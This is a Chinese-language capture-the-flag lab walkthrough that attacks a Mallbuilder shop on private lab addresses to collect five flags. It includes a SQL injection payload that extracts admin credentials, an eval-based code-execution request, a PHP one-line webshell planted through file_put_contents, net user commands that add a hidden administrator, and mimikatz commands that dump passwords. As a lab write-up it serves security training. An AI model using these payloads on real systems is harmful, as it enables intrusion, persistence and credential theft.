### 一、利用SQL注入漏洞获取管理员密码

1.进入网站首页，发现是Mallbuilder，该版本有注入漏洞，可以直接获取管理员密码

[http://192.168.20.178/mall/cate_show_ajax.php?oper=ajax&call=get_cate](http://192.168.201.169/mall/cate_show_ajax.php?oper=ajax&call=get_cate)

POST:

catid=12313213131313113) and EXP(~(SELECT*FROM(SElect user FROM mallbuilder_admin LIMIT 0,1)a))#

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_616f21e1.png)

2.图片中浏览器使用的工具是hackbar 勾选Enable Post data 可以添加post数据

填写后点击右侧execute 即可发出包

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_67e637c1.png)

根据经验可以判断出这是123456的MD5

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m18791195.png)

3.可以直接通过sql注入获取第一个flag：

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_853a3d.png)

flag1{A274C90B84947AD7DA77D19C9159ECF8}

### 二．进入网站后台

根据上一步的注入结果，admin密码为123456,进后台

后台地址为http://192.168.20.178/mall/admin/

进入后台发现第二个flag：

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m7b7250c8.png)

flag2{5D18B19BD7C1AA3B369AC3E1EAF027DD}

### 三．源码审计

1.网上没有公开的后台getshell的漏洞，需要下载一份源码进行简单的审计

在admin\module_translations.php存在代码执行：

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_6693def0.png)

2.mod参数被带入eval执行，但是中间经过了strtoupper函数，这个在后期写马的时候需要注意

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m14007c83.png)

[http://192.168.20.178/mall/admin/module_translations.php](http://192.168.20.178/mall/admin/module_translations.php?mod=;system('whoami')

[?mod=;system('whoami'](http://192.168.20.178/mall/admin/module_translations.php?mod=;system('whoami'))



![img](http://192.168.33.1/uploads/20180330/permeate_13_html_1e60ec1e.png)

http://192.168.20.178/mall/admin/module_translations.php?mod=;system('dir')

3.使用dir列出当前文件，发现flag.php 找到第三个flag

直接type读取

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m7d2065cb.png)

http://192.168.20.178/mall/admin/module_translations.php

?mod=;system('type flag.php')

flag3{26AB5763FA44994C71EEF6BB98A6956E}

### 四．利用命令执行漏洞

1．由于有cookie，不能直接用菜刀，所以用代码执行写一个马出来，需要注意strtoupper函数

[http://192.168.20.178/mall/admin/module_translations.php?mod=;file_put_contents(%271.php%27,%27%3C?php%20@eval($_POST[1\]);?%3E%27)](http://192.168.20.178/mall/admin/module_translations.php?mod=;file_put_contents('1.php',''))



![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m1633689a.png)

2.通过菜刀链接

[http://192.168.20.178/mall/admin/1.PHP](http://192.168.201.169/mall/admin/1.PHP)

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m217b52d5.png)

3.选中webshell 右键点击虚拟终端如下图

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m4726ac71.png)

4.输入以下命令 添加用户

net user simple simple /add

net localgroup administrators simple /add

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m2b0afbbd.png)

5.远程连接3389 快捷键win+r 输入mstsc 远程连接目标主机

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m78f5b68f.png)

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_41f269af.png)

flag4{971BADE4FB06D699FB15D5612F196400}

### 五．使用mimikatz获取管理员密码

1上传mimikatz等获取工具获取管理员密码 目标系统是32位选择对应架构的程序

将三个文件都放在一个文件夹中，进入命令行切换到对应目录

输入mimikatz.exe 运行工具

privilege::debug

sekurlsa::logonpasswords

结果如下图 可以看出管理员账户的密码是Simplexue123

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m4cbe1863.png)

2.重新进行远程登录，这次使用刚刚得到的系统管理员密码登录，在桌面发现第五个flag

![img](http://192.168.33.1/uploads/20180330/permeate_13_html_m767cef1b.png)

flag5{031340FE9D99C36EA459202B9A7F92DC}